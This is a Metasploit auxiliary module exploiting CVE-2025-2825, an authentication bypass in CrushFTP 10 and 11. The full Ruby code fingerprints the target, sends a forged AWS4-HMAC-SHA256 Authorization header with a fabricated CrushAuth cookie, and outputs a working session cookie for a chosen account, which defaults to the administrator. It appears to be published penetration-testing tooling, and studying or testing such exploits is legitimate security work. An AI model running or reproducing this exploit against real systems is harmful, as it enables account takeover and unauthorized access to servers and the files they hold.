##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'CrushFTP AWS4-HMAC Authentication Bypass',
        'Description' => %q{
          This module leverages an authentication bypass in CrushFTP 11 < 11.3.1 and 10 < 10.8.4. Attackers
          with knowledge of a valid username can provide a crafted S3 authentication header to the CrushFTP web API
          to authenticate as that user without valid credentials. When successfully executed, the exploit will
          output working session cookies for the target user account.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Outpost24', # Initial Discovery
          'remmons-r7' # MSF Module & Rapid7 Analysis
        ],
        'References' => [
          ['CVE', '2025-2825'],
          ['URL', 'https://attackerkb.com/topics/k0EgiL9Psz/cve-2025-2825/rapid7-analysis']
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          # The CrushFTP.log file will contain a log of the HTTP requests
          # Similarly, files in logs/session_logs/ will contain a log of the HTTP requests
          # The sessions.obj file will temporarily persist details of recent requests
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('TARGETUSER', [true, 'The target account to forge a session cookie for', 'crushadmin']),
        OptString.new('TARGETURI', [true, 'The URI path to CrushFTP', '/'])
      ]
    )
  end

  def run
    # Unauthenticated requests to WebInterface endpoints should receive a response containing an 'anonymous' user session cookie
    print_status('Confirming the target is a CrushFTP web service')
    res_anonymous = get_anon_session

    fail_with(Failure::Unknown, 'Connection failed - unable to get web API response') unless res_anonymous

    # Confirm that the response returned a CrushAuth cookie and the status code was 404. If this is not the case, the target is probably not CrushFTP
    if (res_anonymous&.code != 404) || res_anonymous&.get_cookies !~ /CrushAuth=([^;]+;)/
      fail_with(Failure::Unknown, 'The target does not appear to be a CrushFTP web service')
    end

    # Generate a properly formatted fake CrushFTP cookie
    user_cookie = generate_fake_cookie

    print_status('Attempting to bypass authentication')
    res_bypass = perform_auth_bypass(datastore['TARGETUSER'], user_cookie)

    # Confirm that the target returns an empty response, otherwise it shouldn't be vulnerable
    fail_with(Failure::NotVulnerable, 'The target unexpectedly returned a response') if res_bypass

    print_good('The target returned the expected empty response and is likely vulnerable')

    # Perform a duplicate request to confirm the cookie is now authenticated
    print_status('Attempting to access an authenticated API endpoint with the malicious session cookie')
    res_bypass = perform_auth_bypass(datastore['TARGETUSER'], user_cookie)

    # Check for request failure, which indicates that the provided username is invalid
    fail_with(Failure::BadConfig, 'Connection failed - the provided username is likely invalid') unless res_bypass

    # If the target doesn't return a success message, assume the exploit failed
    if !res_bypass.body.include? "<response>success</response><username>#{datastore['TARGETUSER']}</username>"
      fail_with(Failure::Unknown, 'Exploit failed - the target did not confirm authentication status')
    end

    cookie_string = "Cookie: CrushAuth=#{user_cookie}; currentAuth=#{user_cookie.to_s[-4..]}"

    print_good("Authentication bypass succeeded! Cookie string generated\n#{cookie_string}\n")

    report_vuln(
      host: rhost,
      name: name,
      refs: references
    )

    store_loot('CrushAuth', 'text/plain', datastore['RHOST'], cookie_string)
  end

  # A GET request to /WebInterface/ should return a 404 response that contains an 'anonymous' user cookie
  def get_anon_session
    send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'WebInterface/')
    )
  end

  def generate_fake_cookie
    current_timestamp = Time.now.to_i
    random_string = Rex::Text.rand_text_alphanumeric(30)
    "#{current_timestamp}_#{random_string}"
  end

  # Make a request to the getUsername web API with the malicious bypass header
  def perform_auth_bypass(username, cookie)
    send_request_cgi(
      {
        'method' => 'POST',
        'uri' => normalize_uri(target_uri.path, 'WebInterface', 'function/'),
        'cookie' => "CrushAuth=#{cookie}",
        'headers' => {
          'Connection' => 'close',
          'Authorization' => "AWS4-HMAC-SHA256 Credential=#{username}/"
        },
        'vars_post' => {
          'command' => 'getUsername',
          # The c2f parameter must be the last four characters of the primary session cookie
          'c2f' => cookie.to_s[-4..]
        }
      }
    )
  end
end
